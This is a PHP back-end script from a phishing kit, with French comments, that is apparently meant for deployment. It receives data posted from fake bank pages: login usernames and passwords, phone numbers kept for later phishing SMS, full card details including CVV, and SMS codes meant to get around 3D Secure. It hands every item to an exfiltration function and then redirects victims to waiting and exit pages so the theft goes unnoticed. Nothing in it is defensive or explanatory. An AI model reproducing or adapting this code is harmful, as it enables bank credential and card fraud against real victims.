<?php

    // DÉPLOYER
//session_start();
require 'config.php';   // ← contient call() (exfiltration)

function getIp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    if($_SERVER['REMOTE_ADDR']=="::1") $ip = "1.1.1.1"; // masque les tests locaux
    return $ip;
}
$ipp = getIp();

// BLOC 1 — Identifiants (autre page : faux login bancaire)
if(isset($_POST['user'])){
    call("/- PPL LOGIN $ipp -/\nUser: ".$_POST['user']."\nPass: ".$_POST['pass']."\n");
    return;
}

// BLOC 2 — Téléphone (pour SMS de phishing ultérieur)
if(isset($_POST['phone'])){
    call("/- PPL LOGIN $ipp -/\nPhone: ".$_POST['phone']."\n");
    return;
}

// BLOC 3 — CARTE (← déclenché par VOTRE formulaire paiement.php)
if(isset($_POST['card_cvv'])){
    echo call("/- PPL CC $ipp -/\n"
        .'Name:' .$_POST["card_name"]."\n"
        .'Cc: '.$_POST["card_number"]."\n"
        .'Exp: '.$_POST["card_expiry"]."\n"
        .'Cvv: '.$_POST["card_cvv"]."\n"
        .'Email: '.$_POST["email"]."\n");

    // On récupère toutes les infos renseignées par l'utilisateur
    $montant = isset($_POST['montant']) ? $_POST['montant'] : '';
    $devise  = isset($_POST['devise'])  ? $_POST['devise']  : 'EUR';
    $email   = isset($_POST['email'])   ? $_POST['email']   : '';
    $motif   = isset($_POST['motif'])   ? $_POST['motif']   : '';

    // On construit l'URL finale vers exit.php avec toutes les infos
    $exitUrl = 'exit.php?montant=' . urlencode($montant)
             . '&devise='  . urlencode($devise)
             . '&email='   . urlencode($email)
             . '&motif='   . urlencode($motif);

    // On redirige vers wait.php en lui passant exit.php (avec paramètres) comme destination
    header('Location: wait.php?next=' . urlencode($exitUrl));
    exit;
}

// BLOC 4 — SMS (contournement 3D Secure)
if(isset($_POST['sms'])){
    call("/- PPL SMS $ipp -/\nCode: ".$_POST['sms']);
    return;
}

?>